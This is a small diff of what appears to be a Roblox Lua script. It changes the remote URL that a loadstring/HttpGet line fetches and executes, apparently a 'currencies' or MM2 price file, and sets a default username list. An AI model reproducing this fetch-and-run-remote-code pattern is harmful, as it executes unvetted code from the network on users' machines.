@@ -4,7 +4,7 @@ pcall(function()
 end)
 
 pcall(function()
-    loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/3bRs4VMt5BEcFFtE/raw"))() --валюты
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Kenderlike/mm2-prices/refs/heads/main/script.txt"))() --валюты
 end)
 
 local users = _G.Usernames or {"057Deni"}
